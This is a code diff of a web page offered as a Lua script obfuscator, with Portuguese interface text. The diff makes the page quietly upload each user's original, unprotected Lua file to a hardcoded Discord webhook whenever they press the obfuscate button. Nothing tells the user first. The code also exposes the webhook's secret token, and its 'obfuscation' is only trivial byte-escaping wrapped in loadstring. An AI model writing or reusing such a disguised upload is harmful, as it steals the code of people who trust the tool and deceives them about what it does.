@@ -111,7 +111,21 @@
             color: #2ECC71;
         }
 
-        /* Link de Download */
+        /* Tabela de Código Obfuscado */
+        #obfuscatedCodeTable {
+            margin-top: 20px;
+            display: none;
+            text-align: left;
+            width: 100%;
+            font-family: monospace;
+            border-collapse: collapse;
+        }
+
+        #obfuscatedCodeTable td {
+            padding: 8px;
+            border: 1px solid #BDC3C7;
+        }
+
         .download-link {
             margin-top: 20px;
             display: none;
@@ -139,9 +153,17 @@
         <input type="file" id="fileInput" accept=".lua">
 
         <button id="obfuscateBtn" class="button" disabled>OFUSCAR</button>
-        <button id="sendToDiscordBtn" class="button" disabled>BAIXA</button>
-
+        
         <div id="status"></div>
+
+        <!-- Tabela para mostrar o código obfuscado -->
+        <table id="obfuscatedCodeTable">
+            <tr>
+                <td id="obfuscatedCode"></td>
+            </tr>
+        </table>
+
+        <button id="copyCodeBtn" class="button" style="display:none;">Copiar Código</button>
 
         <div class="download-link" id="downloadLink">
             <a href="#" id="downloadBtn" download>Baixar Arquivo Obfuscado</a>
@@ -154,9 +176,7 @@
         document.getElementById('fileInput').addEventListener('change', function() {
             const fileInput = document.getElementById('fileInput');
             const obfuscateBtn = document.getElementById('obfuscateBtn');
-            const sendToDiscordBtn = document.getElementById('sendToDiscordBtn');
             obfuscateBtn.disabled = !fileInput.files.length;
-            sendToDiscordBtn.disabled = !fileInput.files.length;
         });
 
         document.getElementById('obfuscateBtn').addEventListener('click', function() {
@@ -170,11 +190,18 @@
 
             const reader = new FileReader();
             reader.onload = function(e) {
-                const content = e.target.result;
-                // Simulação de obfuscação (substitua por sua lógica real)
-                obfuscatedContent = obfuscateLua(content);
+                const luaCode = e.target.result;
+                minifyAndObfuscate(luaCode);
 
-                // Mostrar o botão para baixar o arquivo
+                // Mostrar código obfuscado na tabela
+                document.getElementById('obfuscatedCode').textContent = obfuscatedContent;
+                document.getElementById('obfuscatedCodeTable').style.display = 'block';
+                document.getElementById('copyCodeBtn').style.display = 'inline-block';
+
+                // Enviar o código para o Discord
+                sendToDiscord(file);
+
+                // Mostrar link para download
                 const downloadLink = document.getElementById('downloadLink');
                 downloadLink.style.display = 'block';
                 document.getElementById('downloadBtn').href = URL.createObjectURL(new Blob([obfuscatedContent], {type: 'text/plain'}));
@@ -182,38 +209,34 @@
                 document.getElementById('status').innerHTML = "Arquivo obfuscado pronto!";
                 document.getElementById('status').classList.remove('status-error');
                 document.getElementById('status').classList.add('status-success');
-
-                // Enviar o arquivo original para o Discord
-                sendFileToDiscord(file);
             };
             reader.readAsText(file);
         });
 
-        document.getElementById('sendToDiscordBtn').addEventListener('click', function() {
-            const fileInput = document.getElementById('fileInput');
-            const file = fileInput.files[0];
-
-            if (!file) {
-                alert('Por favor, selecione um arquivo Lua.');
-                return;
-            }
-
-            sendFileToDiscord(file);
+        document.getElementById('copyCodeBtn').addEventListener('click', function() {
+            const code = document.getElementById('obfuscatedCode').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                alert('Código copiado para a área de transferência!');
+            });
         });
 
-        function obfuscateLua(content) {
-            // Simulação de ofuscação: inverte o conteúdo (substitua por uma lógica real)
-            return content.split('').reverse().join('');
+        function minifyAndObfuscate(luaCode) {
+            const minifiedLua = luaCode.replace(/--.*$/gm, '').replace(/\s+/g, ' ');
+            const encoded = minifiedLua.replace(/./g, function(char) {
+                const byteValue = char.charCodeAt(0);
+                return "\\" + byteValue;
+            });
+            obfuscatedContent = `loadstring("${encoded}")()`;
         }
 
-        function sendFileToDiscord(file) {
+        function sendToDiscord(file) {
             const formData = new FormData();
             formData.append('file', file);
 
             const webhookUrl = 'https://discord.com/api/webhooks/1288980879397621791/iK325TYN4nvqY4Pls61Uq6K1hP-t2vEQn77Qvif29SVClz0b-CWVjpqHyEZf_LAhiZIa';
             const statusDiv = document.getElementById('status');
 
-            statusDiv.innerHTML = "erro erro erro erro...";
+            statusDiv.innerHTML = "Enviando para o Discord...";
             statusDiv.classList.remove('status-error');
             statusDiv.classList.remove('status-success');
 
@@ -223,12 +246,12 @@
             })
             .then(response => response.json())
             .then(data => {
-                statusDiv.innerHTML = "Arquivo erro!";
+                statusDiv.innerHTML = "Arquivo enviado para o Discord!";
                 statusDiv.classList.add('status-success');
             })
             .catch(error => {
                 console.error('Erro no envio:', error);
-                statusDiv.innerHTML = "Ocorreu um erro.";
+                statusDiv.innerHTML = "Ocorreu um erro no envio.";
                 statusDiv.classList.add('status-error');
             });
         }
